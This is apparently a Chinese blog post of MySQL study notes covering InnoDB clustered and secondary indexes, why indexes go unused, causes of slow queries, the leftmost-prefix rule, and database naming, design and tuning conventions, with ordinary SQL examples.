<p><strong>在innodb中</strong>，在聚簇索引之上创建的索引称之为辅助索引，非聚簇索引都是辅助索引，像复合索引、前缀索引、唯一索引。<strong>辅助索引叶子节点存储的不再是行的物理位置，而是主键值，辅助索引访问数据总是需要二次查找</strong>。</p>
<p><img src="https://oscimg.oschina.net/oscnet/ce9bedd0dc9013e14e5f450e2149704bef5.jpg" alt="img"></p>
<ol>
<li>InnoDB使用的是聚簇索引，将主键组织到一棵B+树中，而行数据就储存在叶子节点上，若使用”where id = 14”这样的条件查找主键，则按照B+树的检索算法即可查找到对应的叶节点，之后获得行数据。</li>
<li>若对Name列进行条件搜索，则需要两个步骤：第一步在辅助索引B+树中检索Name，到达其叶子节点获取对应的主键。第二步使用主键在主索引B+树种再执行一次B+树检索操作，最终到达叶子节点即可获取整行数据。（重点在于通过其他键需要建立辅助索引）</li>
</ol>
<p><strong>聚簇索引具有唯一性</strong>，由于聚簇索引是将数据跟索引结构放到一块，因此一个表仅有一个聚簇索引。</p>
<p><strong>表中行的物理顺序和索引中行的物理顺序是相同的</strong>，<strong>在创建任何非聚簇索引之前创建聚簇索引</strong>，这是因为聚簇索引改变了表中行的物理顺序，数据行 按照一定的顺序排列，并且自动维护这个顺序；</p>
<p><strong>聚簇索引默认是主键</strong>，如果表中没有定义主键，InnoDB 会选择一个<strong>唯一且非空的索引</strong>代替。如果没有这样的索引，InnoDB 会<strong>隐式定义一个主键（类似oracle中的RowId）</strong>来作为聚簇索引。如果已经设置了主键为聚簇索引又希望再单独设置聚簇索引，必须先删除主键，然后添加我们想要的聚簇索引，最后恢复设置主键即可。</p>
<p>MyISAM使用的是非聚簇索引，<strong>非聚簇索引的两棵B+树看上去没什么不同</strong>，节点的结构完全一致只是存储的内容不同而已，主键索引B+树的节点存储了主键，辅助键索引B+树存储了辅助键。表数据存储在独立的地方，这两颗B+树的叶子节点都使用一个地址指向真正的表数据，对于表数据来说，这两个键没有任何差别。由于<strong>索引树是独立的，通过辅助键检索无需访问主键的索引树</strong>。</p>
<p><img src="https://oscimg.oschina.net/oscnet/59066cb190ec7579c34e2cd77a1f47e8b68.jpg" alt="img"></p>
<p><strong>使用聚簇索引的优势：</strong></p>
<p><strong>每次使用辅助索引检索都要经过两次B+树查找，</strong>看上去聚簇索引的效率明显要低于非聚簇索引，这不是多此一举吗？聚簇索引的优势在哪？</p>
<p>1.由于行数据和聚簇索引的叶子节点存储在一起，同一页中会有多条行数据，访问同一数据页不同行记录时，已经把页加载到了Buffer中（缓存器），再次访问时，会在内存中完成访问，不必访问磁盘。这样主键和行数据是一起被载入内存的，找到叶子节点就可以立刻将行数据返回了，如果按照主键Id来组织数据，获得数据更快。</p>
<p>2.辅助索引的叶子节点，存储主键值，而不是数据的存放地址。好处是当行数据放生变化时，索引树的节点也需要分裂变化；或者是我们需要查找的数据，在上一次IO读写的缓存中没有，需要发生一次新的IO操作时，可以避免对辅助索引的维护工作，只需要维护聚簇索引树就好了。另一个好处是，因为辅助索引存放的是主键值，减少了辅助索引占用的存储空间大小。</p>
<p>注：我们知道一次io读写，可以获取到16K大小的资源，我们称之为读取到的数据区域为Page。而我们的B树，B+树的索引结构，叶子节点上存放好多个关键字（索引值）和对应的数据，都会在一次IO操作中被读取到缓存中，所以在访问同一个页中的不同记录时，会在内存里操作，而不用再次进行IO操作了。除非发生了页的分裂，即要查询的行数据不在上次IO操作的换村里，才会触发新的IO操作。</p>
<p>3.因为MyISAM的主索引并非聚簇索引，那么他的数据的物理地址必然是凌乱的，拿到这些物理地址，按照合适的算法进行I/O读取，于是开始不停的寻道不停的旋转。聚簇索引则只需一次I/O。（强烈的对比）</p>
<p>4.不过，如果涉及到大数据量的排序、全表扫描、count之类的操作的话，还是MyISAM占优势些，因为索引所占空间小，这些操作是需要在内存中完成的。</p>
<p><strong>聚簇索引需要注意的地方</strong></p>
<p>当使用主键为聚簇索引时，主键最好不要使用uuid，因为uuid的值太过离散，不适合排序且可能出线新增加记录的uuid，会插入在索引树中间的位置，导致索引树调整复杂度变大，消耗更多的时间和资源。</p>
<p>建议使用int类型的自增，方便排序并且默认会在索引树的末尾增加主键值，对索引树的结构影响最小。而且，主键值占用的存储空间越大，辅助索引中保存的主键值也会跟着变大，占用存储空间，也会影响到IO操作读取到的数据量。</p>
<p><strong>为什么主键通常建议使用自增id</strong></p>
<p><strong>聚簇索引的数据的物理存放顺序与索引顺序是一致的</strong>，即：<strong>只要索引是相邻的，那么对应的数据一定也是相邻地存放在磁盘上的</strong>。如果主键不是自增id，那么可以想 象，它会干些什么，不断地调整数据的物理地址、分页，当然也有其他一些措施来减少这些操作，但却无法彻底避免。但，如果是自增的，那就简单了，它只需要一 页一页地写，索引结构相对紧凑，磁盘碎片少，效率也高。</p>
<h1 id="14-索引失效的情况"><a href="#14-索引失效的情况" class="headerlink" title="14. 索引失效的情况"></a>14. 索引失效的情况</h1><ol>
<li>最左原则失效</li>
<li>如果查询时两个表关联列类型不一致会自动<strong>进行数据类型隐式转换</strong>，会造成列上的索引失效，导致查询效率降低</li>
<li>不同的字符集进行比较前需要进行转换会造成索引失效</li>
<li>not in 也通常会使索引失效。</li>
<li>对字段进行了函数操作</li>
<li>对字段的做了运算，如:<code>SELECT * FROM t WHRER c-1 = 1000;</code>  </li>
</ol>
<h1 id="16-一条SQL语句执行很慢的原因"><a href="#16-一条SQL语句执行很慢的原因" class="headerlink" title="16. 一条SQL语句执行很慢的原因"></a>16. 一条SQL语句执行很慢的原因</h1><p>需要分两种情况讨论：</p>
<ol>
<li>大多数情况是正常的，只是偶尔会出现很慢的情况</li>
<li>在数据量不变的情况下，这条SQL语句一直以来都执行的很慢</li>
</ol>
<h2 id="偶尔很慢的情况"><a href="#偶尔很慢的情况" class="headerlink" title="偶尔很慢的情况"></a>偶尔很慢的情况</h2><p>在这种情况下，这条SQL语句本身是没什么问题的，而是其它原因导致的，主要有以下几个原因：</p>
<h3 id="1-数据库在刷新脏页"><a href="#1-数据库在刷新脏页" class="headerlink" title="1. 数据库在刷新脏页"></a>1. 数据库在刷新脏页</h3><p>当要往数据库插入一条数据、或者更新一条数据的时候，数据库会在内存中把对应的字段数据更新，但是更新之后，这些更新的字段并不会马上同步持久化到磁盘中去，而是把这些更新的记录写入到<code>redo log</code>日记中去，等到空闲的时候，再通过<code>redo log</code>里的日记把最新的数据同步到磁盘中去。</p>
<blockquote>
<p>当内存数据页跟磁盘数据页内容不一致的时候，称这个内存页为“脏页”。当内存数据写入到磁盘后，内存和磁盘上的数据页的内容就一致了，称为“干净页”</p>
</blockquote>
<h4 id="以下4中场景会出现刷脏页的情况："><a href="#以下4中场景会出现刷脏页的情况：" class="headerlink" title="以下4中场景会出现刷脏页的情况："></a>以下4中场景会出现刷脏页的情况：</h4><ul>
<li><strong>redolog写满了</strong>：<code>redo log</code>里的容量是有限的，如果数据库一直很忙，更新又很频繁，这个时候<code>redo log</code>很快就会被写满，这个时候就没办法等到空闲的时候再把数据同步到磁盘，只能暂停其他操作，全身心来把数据同步到磁盘中去，而这个时候，就会导致平时正常的SQL语句突然执行的很慢，所以说，数据库在同步数据到磁盘的时候，就有可能导致SQL语句执行的很慢了。</li>
<li><strong>内存不够用了</strong>：如果一次查询较多的数据，恰好碰到所查数据页不在内存中，需要申请内存，而此时恰好内存不足的时候就需要淘汰一部分内存数据页，如果是干净页，就直接释放，如果恰好是脏页就需要刷脏页。</li>
<li><strong>MySQL认为系统“空闲”的时候</strong></li>
<li><strong>MySQL正常关闭的时候</strong>：这个时候，MysQL会把内存的脏页都<code>flush</code>到磁盘上，这样下次MySQL启动的时候，就可以直接从磁盘上读数据，启动速度会很快。</li>
</ul>
<h3 id="2-拿不到锁"><a href="#2-拿不到锁" class="headerlink" title="2. 拿不到锁"></a>2. 拿不到锁</h3><p>要执行的这条语句涉及到的表，刚好有其他进程在用，并且加锁了，这时候该线程拿不到锁，只能慢慢等待释放锁。或者，表没有加锁，但是使用到的某一行被加锁了，这个时候也会造成阻塞。</p>
<p>如果要判断是否真的在等待锁，可以用<code>show processlist</code>这个命令来查看当前的状态。</p>
<h2 id="针对一直都很慢的情况"><a href="#针对一直都很慢的情况" class="headerlink" title="针对一直都很慢的情况"></a>针对一直都很慢的情况</h2><p>如果在数据量一样大的情况下，这条SQL语句每次执行都很慢，就有可能是SQL语句写的有问题。有可能有以下问题：</p>
<p>例如有以下表：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE TABLE &#39;t&#39; (</span><br><span class="line"> &#39;id&#39; int(11) NOT NULL,</span><br><span class="line"> &#39;c&#39; int(11) DEFAULT NULL,</span><br><span class="line"> &#39;d&#39; int(11) DEFAULT NULL,</span><br><span class="line"> PRIMARY KEY(&#39;id&#39;)</span><br><span class="line">) ENGINE&#x3D;InnoDB;</span><br></pre></td></tr></table></figure>

<h3 id="1-没有用到索引"><a href="#1-没有用到索引" class="headerlink" title="1. 没有用到索引"></a>1. 没有用到索引</h3><p>例如执行以下查询语句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT * FROM t WHERE 100&lt;c AND c&lt;100000;</span><br></pre></td></tr></table></figure>

<h4 id="字段没有索引"><a href="#字段没有索引" class="headerlink" title="字段没有索引"></a>字段没有索引</h4><p>这个时候因为c字段上没有索引，所以只能走<strong>全表扫描</strong>，这就会导致这条语句执行很慢。</p>
<h4 id="字段有索引但是没有用到"><a href="#字段有索引但是没有用到" class="headerlink" title="字段有索引但是没有用到"></a>字段有索引但是没有用到</h4><p>这时候如果给c加上了索引，然后执行以下查询：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT * FROM t WHRER c-1 &#x3D; 1000;</span><br></pre></td></tr></table></figure>

<p>这时，<strong>由于在字段的左边做了运算</strong>，在查询的时候，就不会用上索引。正确的查询应该如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT * FROM t WHERE c &#x3D; 1000+1;</span><br></pre></td></tr></table></figure>

<h4 id="函数操作导致没有用上索引"><a href="#函数操作导致没有用上索引" class="headerlink" title="函数操作导致没有用上索引"></a>函数操作导致没有用上索引</h4><p>如果在查询的时候，对字段进行了函数操作，也是会导致没有用上索引，如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT * FROM t WHERE pow(c,2)&#x3D;1000;</span><br></pre></td></tr></table></figure>

<h3 id="2-数据库自己选错了索引"><a href="#2-数据库自己选错了索引" class="headerlink" title="2. 数据库自己选错了索引"></a>2. 数据库自己选错了索引</h3><p>主键索引和非主键索引是有区别的，<strong>主键索引存放的值是整行字段的数据</strong>，而<strong>非主键索引上存放的是主键字段的值</strong>。</p>
<p>例如下面的查询语句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT * FROM t WHERE 100&lt;c AND c&gt;10000;</span><br></pre></td></tr></table></figure>

<p>如果走c这个字段的索引的话，最后会查询到对应主键的值，然后再根据主键的值走主键索引，查询到整行数据返回。</p>
<p>但是，就算c字段上有索引，系统也并不一定会走c这个字段上的索引，而是有可能会<strong>直接扫描全表</strong>，找出所有符合<code>100&lt;c AND c&lt;1000</code>的数据。</p>
<h4 id="原因："><a href="#原因：" class="headerlink" title="原因："></a>原因：</h4><p>系统在执行这条语句的时候，会进行预测：究竟是走c索引扫描的行数少，还是直接扫描全表的扫描行行数少，显然，扫描行数越少越好，因为这意味着IO操作的次数越少。</p>
<p>如果进行全表扫描的话，扫描的次数就是这个表的总行数n，如果走索引扫描的话，通过索引c找到主键后，还要再通过主键索引来找整行的数据，也就是说需要走两次索引，而且，我们也不知道<code>100&lt;c AND c&lt;10000</code>这个条件的数据多少行，如果整个表的全部数据都符合，那么这时候如果走c索引不仅要扫面行数n，还要每行数据走两次索引。</p>
<p>系统的预测主要是通过<strong>索引的区分度</strong>来判断(<strong>区分度=列中不同值的数量/列的总行数</strong>)，一个索引上不同的值越多，意味着出现相同数值的索引越少，意味着索引的区分度越高。索引的区分度又叫<strong>基数</strong>，即区分度越高，基数越大，意味着符合<code>100&lt;c AND c&gt;10000</code>这个条件的行数越少。</p>
<p>所以，一个索引的基数越大，意味着走索引查询越有优势。</p>
<p>系统并不会遍历全部来获得一个索引的基数，其代价太大，索引系统是通过遍历部分数据，也就是通过<strong>采样</strong>的方式来预测索引的基数的，采样就有可能出现失误的情况，也即是说，c这个索引的基数有可能是很大的，但是采样的时候，把这个索引的基数预测成很小，系统就不走c索引了，而直接走全部扫描。</p>
<p>也就是说，由于统计的失误，有可能导致系统没有走索引而是走了全表扫描</p>
<blockquote>
<p>系统判断是否走索引，扫描行数的预测其实只是原因之一，这条查询语句是否需要使用使用临时表、是否需要排序等也是会影响系统的选择的。</p>
</blockquote>
<p>可以通过强制走索引的方式来查询：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT * FROM t FORCE INDEX(a) WHERE 100&lt;c AND c&lt;10000;</span><br></pre></td></tr></table></figure>

<p>也可以通过：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SHOW INDEX FROM t;</span><br></pre></td></tr></table></figure>

<p>来查询索引的基数和实际是否符合，如果和实际很不符合，可以重新来统计索引的基数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ANALYZE TABLE t;</span><br></pre></td></tr></table></figure>

<p>既然会预测错索引的基数，也就意味着，当我们查询语句有多个索引的时候，系统可能会选错索引</p>
<h1 id="17-MySQL的基本存储结构"><a href="#17-MySQL的基本存储结构" class="headerlink" title="17. MySQL的基本存储结构"></a>17. MySQL的基本存储结构</h1><p>MySQL的基本存储结构是页，记录都存在页里边：</p>
<p><img src="https://img-blog.csdnimg.cn/20190406161753442.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzM3OTQxNDgz,size_16,color_FFFFFF,t_70#pic_center" alt="mysql存储结构"></p>
<p><img src="https://img-blog.csdnimg.cn/2019040616182682.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzM3OTQxNDgz,size_16,color_FFFFFF,t_70" alt="插入记录"></p>
<p>每个数据页可以组成一个<strong>双向链表</strong>，同时每个数据页中的记录又可以组成一个<strong>单向链表</strong>。</p>
<p>每个数据页都会为存储在它里边的记录生成一个页目录，在<strong>通过主键查找某条记录</strong>的时候可以在页目录中使用二分法快速定位到对应的槽，然后再遍历该槽对应分组中的记录即可快速找到指定的记录。</p>
<p>以其它列（非主键）作为搜索条件：只能从最小记录开始依次遍历单链表中的每条记录。所以说，如果写<code>SELECT * FROM user WHERE indexname = &#39;xxx&#39;</code>这样没有进行任何优化的sql语句，默认会这样做：</p>
<ul>
<li>定位到记录所在的页：需要遍历双向链表，找到所在的页</li>
<li>从所在的页内中查找相应的记录：由于不是根据主键查询，只能遍历所在页的单链表。</li>
</ul>
<p>在数据量很大的情况下，这种查询会很慢，时间复杂度为O(n)。</p>
<h1 id="18-什么是最左前缀原则"><a href="#18-什么是最左前缀原则" class="headerlink" title="18. 什么是最左前缀原则"></a>18. 什么是最左前缀原则</h1><p>在 mysql 建立联合索引时会遵循最左前缀匹配的原则，即最左优先，在检索数据时从联合索引的最左边开始匹配，示例：<br>对列col1、列col2和列col3建一个联合索引</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">KEY test_col1_col2_col3 on test(col1,col2,col3);</span><br></pre></td></tr></table></figure>

<p>联合索引 test_col1_col2_col3 实际上相当于建立了<code>(col1)、(col1,col2)、(col,col2,col3)</code>三个索引。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT * FROM test WHERE col1&#x3D;“1” AND clo2&#x3D;“2” AND clo4&#x3D;“4”</span><br></pre></td></tr></table></figure>

<p>上面这个查询语句执行时会依照最左前缀匹配原则，检索时会使用索引(col1,col2)进行数据匹配。</p>
<p>MySQL中索引可以以一定顺序引用多列，这种索引叫做联合索引。如<code>User</code>表的<code>name</code>和<code>city</code>加联合索引就是<code>(name,city)</code>。而最左前缀原则指的是：如果查询的时候查询条件精确匹配索引的左边连续一列或几列，则此列就可以被用到。如以下例子：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT * FROM user WHERE name &#x3D; xx AND city &#x3D; xx; &#x2F;&#x2F;可以命中索引</span><br><span class="line">SELECT * FROM user WHERE name &#x3D; xx; &#x2F;&#x2F;可以命中索引</span><br><span class="line">SELECT * FROM user WHERE city &#x3D; xx; &#x2F;&#x2F;无法命中索引</span><br></pre></td></tr></table></figure>

<p>需要注意的是，查询的时候如果两个条件都用上了，但是顺序不同，如<code>city == xx AND name = xx</code>,那么查询的时候<strong>会自动优化为匹配联合索引的顺序</strong>，能够命中索引。</p>
<p>由于最左前缀原则，在创建联合索引的时候，索引字段的顺序需要考虑字段值去重之后的个数，区分度较高的放前面。<code>ORDERBY</code>语句也遵循此规则。</p>
<h2 id="为什么要使用联合索引"><a href="#为什么要使用联合索引" class="headerlink" title="为什么要使用联合索引"></a>为什么要使用联合索引</h2><ul>
<li><strong>减少开销</strong>。建一个联合索引(col1,col2,col3)，实际相当于建了(col1),(col1,col2),(col1,col2,col3)三个索引。每多一个索引，都会增加写操作的开销和磁盘空间的开销。对于大量数据的表，使用联合索引会大大的减少开销！</li>
<li><strong>覆盖索引</strong>。对联合索引(col1,col2,col3)，如果有如下的 sql: <code>select col1,col2,col3 from test where col1=1 and col2=2</code>。那么 MySQL 可以直接通过遍历索引取得数据，而无需回表，这减少了很多的随机 io 操作。减少 io 操作，特别的随机 io 其实是 dba 主要的优化策略。所以，在真正的实际应用中，覆盖索引是主要的提升性能的优化手段之一。</li>
<li><strong>效率高</strong>。索引列越多，通过索引筛选出的数据越少。有 1000W 条数据的表，有如下 sql:<code>select from table where col1=1 and col2=2 and col3=3</code>,假设假设每个条件可以筛选出 10% 的数据，如果只有单值索引，那么通过该索引能筛选出 <code>1000W x 10%=100w</code> 条数据，然后再回表从 100w 条数据中找到符合 <code>col2=2 and col3= 3</code> 的数据，然后再排序，再分页；如果是联合索引，通过索引筛选出 <code>1000w10% 10% *10%=1w</code>，效率提升可想而知。</li>
</ul>
<h2 id="联合索引失效"><a href="#联合索引失效" class="headerlink" title="联合索引失效"></a>联合索引失效</h2><p>对于联合索引(col1,col2,col3)，查询语句 <code>SELECT * FROM test WHERE col2=2;</code>是否能够触发索引？</p>
<p><strong>实际上是会触发索引的</strong>，原因：</p>
<p>使用 <code>explain</code> 进行性能分析：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">EXPLAIN SELECT * FROM test WHERE col2&#x3D;2;</span><br><span class="line">EXPLAIN SELECT * FROM test WHERE col1&#x3D;1;</span><br></pre></td></tr></table></figure>

<p>观察上述两个 explain 结果中的 type 字段。查询中分别是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">type: index</span><br><span class="line">type: ref</span><br></pre></td></tr></table></figure>

<ul>
<li>index：这种类型表示 mysql 会对整个该索引进行扫描。要想用到这种类型的索引，对这个索引并无特别要求，只要是索引，或者某个联合索引的一部分，mysql 都可能会采用 index 类型的方式扫描。但是呢，缺点是效率不高，mysql 会从索引中的第一个数据一个个的查找到最后一个数据，直到找到符合判断条件的某个索引。所以，上述语句会触发索引。</li>
<li>ref：这种类型表示 mysql 会根据特定的算法快速查找到某个符合条件的索引，而不是会对索引中每一个数据都进行一一的扫描判断，也就是所谓平常理解的使用索引查询会更快的取出数据。而要想实现这种查找，索引却是有要求的，要实现这种能快速查找的算法，索引就要满足特定的数据结构。简单说，也就是索引字段的数据必须是有序的，才能实现这种类型的查找，才能利用到索引。</li>
</ul>
<h2 id="最左前缀原则原因"><a href="#最左前缀原则原因" class="headerlink" title="最左前缀原则原因"></a>最左前缀原则原因</h2><p>b+ 树的数据项是复合的数据结构，比如 (name,age,sex) 的时候，b+ 树是按照从左到右的顺序来建立搜索树的，比如当 (张三,20,F) 这样的数据来检索的时候，b+ 树会优先比较 name 来确定下一步的所搜方向，如果 name 相同再依次比较 age 和 sex，最后得到检索的数据；但当 (20,F) 这样的没有 name 的数据来的时候，b+ 树就不知道第一步该查哪个节点，因为建立搜索树的时候 name 就是第一个比较因子，必须要先根据 name 来搜索才能知道下一步去哪里查询</p>
<p>比如当 (张三, F) 这样的数据来检索时，b+ 树可以用 name 来指定搜索方向，但下一个字段 age 的缺失，所以只能把名字等于张三的数据都找到，然后再匹配性别是 F 的数据了， 这个是非常重要的性质，即索引的最左匹配特性。（这种情况无法用到联合索引）</p>
<h1 id="19-数据库命名规范"><a href="#19-数据库命名规范" class="headerlink" title="19. 数据库命名规范"></a>19. 数据库命名规范</h1><ol>
<li>所有数据库对象名称必须使用小写字母并用<strong>下划线</strong>分割</li>
<li>所有数据库对象名称禁止使用MySQL保留关键字（<strong>如果表名中包含关键字查询时，需要将其用单引号括起来</strong>）</li>
<li>数据库对象的命名要能做到见名识意，并且最后不要超过 32 个字符</li>
<li>临时库表必须以<code>tmp_</code>为前缀并以日期为后缀，备份表必须以<code>bak_</code>为前缀并以**日期(时间戳)**为后缀</li>
<li>所有存储相同数据的列名和列类型必须一致（一般作为关联列，<strong>如果查询时关联列类型不一致会自动进行数据类型隐式转换，会造成列上的索引失效，导致查询效率降低</strong>）</li>
</ol>
<h1 id="20-数据库基本设计规范和优化"><a href="#20-数据库基本设计规范和优化" class="headerlink" title="20. 数据库基本设计规范和优化"></a>20. 数据库基本设计规范和优化</h1><h2 id="所有表必须使用Innodb存储引擎"><a href="#所有表必须使用Innodb存储引擎" class="headerlink" title="所有表必须使用Innodb存储引擎"></a>所有表必须使用Innodb存储引擎</h2><p>没有特殊要求（即<code>Innodb</code>无法满足的功能如：列存储，存储空间数据等）的情况下，所有表必须使用<code>Innodb</code>存储引擎（MySQL5.5之前默认使用<code>MyIsam</code>，5.6以后默认的为<code>Innodb</code>）。</p>
<p><code>Innodb</code>支持事务，支持行级锁，更好的恢复性，高并发下性能更好。</p>
<h2 id="数据库和表的字符集同一使用UTF-8"><a href="#数据库和表的字符集同一使用UTF-8" class="headerlink" title="数据库和表的字符集同一使用UTF-8"></a>数据库和表的字符集同一使用UTF-8</h2><p>兼容性更好，统一字符集可以避免由于字符集转换产生的乱码，<strong>不同的字符集进行比较前需要进行转换会造成索引失效</strong>，如果数据库中有存储<code>emoji</code>表情的需要，字符集需要采用<code>utf8mb4</code>字符集</p>
<h2 id="所有表和字段都需要添加注释"><a href="#所有表和字段都需要添加注释" class="headerlink" title="所有表和字段都需要添加注释"></a>所有表和字段都需要添加注释</h2><p>使用<code>comment</code>从句添加表和列的备注，从一开始就进行数据字典的维护</p>
<h2 id="尽量控制单表数据量的大小-建议控制在-500-万以内。"><a href="#尽量控制单表数据量的大小-建议控制在-500-万以内。" class="headerlink" title="尽量控制单表数据量的大小,建议控制在 500 万以内。"></a>尽量控制单表数据量的大小,建议控制在 500 万以内。</h2><p>500 万并不是 MySQL 数据库的限制，过大会造成修改表结构，备份，恢复都会有很大的问题。</p>
<p>可以用历史数据归档（应用于日志数据），分库分表（应用于业务数据）等手段来控制数据量大小</p>
<h2 id="谨慎使用-MySQL-分区表"><a href="#谨慎使用-MySQL-分区表" class="headerlink" title="谨慎使用 MySQL 分区表"></a>谨慎使用 MySQL 分区表</h2><p>分区表在物理上表现为多个文件，在逻辑上表现为一个表；</p>
<p>谨慎选择分区键，跨分区查询效率可能更低；</p>
<p>建议采用物理分表的方式管理大数据。</p>
<h2 id="尽量做到冷热数据分离-减小表的宽度"><a href="#尽量做到冷热数据分离-减小表的宽度" class="headerlink" title="尽量做到冷热数据分离,减小表的宽度"></a>尽量做到冷热数据分离,减小表的宽度</h2><p>MySQL 限制每个表最多存储 4096 列，并且每一行数据的大小不能超过 65535 字节。</p>
<p>减少磁盘 IO,保证热数据的内存缓存命中率（<strong>表越宽，把表装载进内存缓冲池时所占用的内存也就越大,也会消耗更多的 IO</strong>）；</p>
<p>更有效的利用缓存，避免读入无用的冷数据；</p>
<p>经常一起使用的列放到一个表中（避免更多的关联操作）。</p>
<h2 id="禁止在表中建立预留字段"><a href="#禁止在表中建立预留字段" class="headerlink" title="禁止在表中建立预留字段"></a>禁止在表中建立预留字段</h2><p>预留字段的命名很难做到见名识义。</p>
<p>预留字段无法确认存储的数据类型，所以无法选择合适的类型。</p>
<p><strong>对预留字段类型的修改，会对表进行锁定</strong>。</p>
<h2 id="禁止在数据库中存储图片-文件等大的二进制数据"><a href="#禁止在数据库中存储图片-文件等大的二进制数据" class="headerlink" title="禁止在数据库中存储图片,文件等大的二进制数据"></a>禁止在数据库中存储图片,文件等大的二进制数据</h2><p>通常文件很大，会短时间内造成数据量快速增长，数据库进行数据库读取时，通常会进行大量的随机 IO 操作，文件很大时，IO 操作很耗时。</p>
<p>通常存储于文件服务器，数据库只存储文件地址信息</p>
<h2 id="禁止在线上做数据库压力测试"><a href="#禁止在线上做数据库压力测试" class="headerlink" title="禁止在线上做数据库压力测试"></a>禁止在线上做数据库压力测试</h2><h2 id="禁止从开发环境-测试环境直接连接生产环境数据库"><a href="#禁止从开发环境-测试环境直接连接生产环境数据库" class="headerlink" title="禁止从开发环境,测试环境直接连接生产环境数据库"></a>禁止从开发环境,测试环境直接连接生产环境数据库</h2><h2 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h2><ul>
<li><p>索引优化：避免索引失效，遵循相关设计规范</p>
</li>
<li><p>参数优化:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">innodb_buffer_size            缓冲区大小</span><br><span class="line">innodb_buffer_pool_instance   缓冲池实例个数</span><br><span class="line">innodb_old_blocks_pct         读取的页放入缓冲区LRU的位置，默认37%</span><br><span class="line">innodb_old_blocks_time        读取的页等待多久才放入LRU</span><br><span class="line">innodb_log_buffer_size        undo日志缓冲区大小，默认8M</span><br><span class="line">innodb_page_size              每一页的大小</span><br><span class="line">max_connections               最大连接数</span><br><span class="line">key_buffer_size</span><br><span class="line">innodb_thread_concurrency     最大并发线程数</span><br><span class="line">thread_cache_size             缓存的最大线程数</span><br><span class="line">tmp_table_size                超过该值的用硬盘临时表，低于改值的直接放内存</span><br><span class="line">query_cache_limit             超过此大小的查询将不缓存</span><br><span class="line">query_cache_min_res_unit      缓存块的最小大小</span><br><span class="line">query_cache_size              查询缓存大小</span><br><span class="line">innodb_log_buffer_size        日志缓冲大小</span><br><span class="line">slow_query_log &#x3D; ON           开启慢查询</span><br><span class="line">long_query_time &#x3D; 3           超过3s的为慢查询</span><br><span class="line">innodb_flush_log_at_trx_commit重做日志从缓冲刷新到磁盘的策略：0表示不记录redo日志</span><br></pre></td></tr></table></figure>
</li>
<li><p>主从优化：通过配置主库和从库，主库负责读取删改，从库负责只读，做到读写分离，并根据读写要求的不同配置不同的系统参数</p>
</li>
<li><p>分库分表：对大表进行优化</p>
</li>
</ul>
<h1 id="21-数据库字段设计规范"><a href="#21-数据库字段设计规范" class="headerlink" title="21. 数据库字段设计规范"></a>21. 数据库字段设计规范</h1><h2 id="优先选择符合存储需要的最小的数据类型"><a href="#优先选择符合存储需要的最小的数据类型" class="headerlink" title="优先选择符合存储需要的最小的数据类型"></a>优先选择符合存储需要的最小的数据类型</h2><p>原因：列的字段越大，建立索引时所需要的空间也就越大，这样一页中所能存储的索引节点的数量也就越少，在遍历时所需要的 IO 次数也就越多，索引的性能也就越差。</p>
<h3 id="方法："><a href="#方法：" class="headerlink" title="方法："></a>方法：</h3><h4 id="将字符串转换成数字类型存储-如-将-IP-地址转换成整形数据"><a href="#将字符串转换成数字类型存储-如-将-IP-地址转换成整形数据" class="headerlink" title="将字符串转换成数字类型存储,如:将 IP 地址转换成整形数据"></a>将字符串转换成数字类型存储,如:将 IP 地址转换成整形数据</h4><p>MySQL 提供了两个方法来处理 ip 地址</p>
<ul>
<li><code>inet_aton</code>: 把 ip 转为无符号整型 (4-8 位)</li>
<li><code>inet_ntoa</code>: 把整型的 ip 转为地址</li>
</ul>
<p>插入数据前，先用<code>inet_aton</code>把 ip 地址转为整型，可以节省空间，显示数据时，使用<code>inet_ntoa</code>把整型的 ip 地址转为地址显示即可。</p>
<h4 id="对于非负型的数据-如自增-ID-整型-IP-来说-要优先使用无符号整型来存储"><a href="#对于非负型的数据-如自增-ID-整型-IP-来说-要优先使用无符号整型来存储" class="headerlink" title="对于非负型的数据 (如自增 ID,整型 IP) 来说,要优先使用无符号整型来存储"></a>对于非负型的数据 (如自增 ID,整型 IP) 来说,要优先使用无符号整型来存储</h4><p>原因：无符号相对于有符号可以多出一倍的存储空间</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SIGNED INT -2147483648~2147483647</span><br><span class="line">UNSIGNED INT 0~4294967295</span><br></pre></td></tr></table></figure>

<p><code>VARCHAR(N)</code> 中的 N 代表的是<strong>字符数</strong>，而不是字节数，使用 UTF8 存储 255 个汉字<code>Varchar(255)=765</code>个字节。过大的长度会消耗更多的内存。</p>
